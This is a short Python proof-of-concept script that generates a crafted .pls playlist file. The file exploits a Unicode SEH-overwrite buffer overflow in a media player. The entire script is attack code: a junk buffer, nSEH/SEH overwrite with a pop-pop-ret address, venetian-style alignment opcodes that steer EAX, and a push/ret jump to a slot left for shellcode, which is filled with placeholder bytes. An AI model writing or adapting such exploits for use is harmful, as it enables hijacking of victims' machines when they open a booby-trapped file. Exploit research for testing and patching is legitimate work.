#!/usr/bin/env python
# PoC6.py

header = "[playlist]\nNumberOfEntries=1\n\n"
header+= "File1="

totalsize = 5000
junk = "A"*4029
nseh = "\x42\x6d" # single byte op + nop/align <--|
seh  = "\x0e\x45" # pop-pop-ret ------------------+

# Put valid address from the stack into EAX
align = "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align

# Increment EAX to point to the future shellcode location
# the minimum it is possible to jump is 100 bytes due to limitations
# imposed by the Unicode conversion.
align+= "\x05\x02\x11" # add eax,11000200
align+= "\x6d"         # nop/align
align+= "\x2d\x01\x11" # sub eax,11000100
align+= "\x6d"         # nop/align

# Jump to the future shellcode location
jump  = "\x50" # push eax
jump += "\x6d" #         nop/align
jump += "\xc3" # ret

rest = "D"*(totalsize - len(junk + nseh + seh + align + jump))

payload = header + junk + nseh + seh + align + jump + rest + "\n"

f = open('playlist.pls','w')
f.write(payload)
f.close()
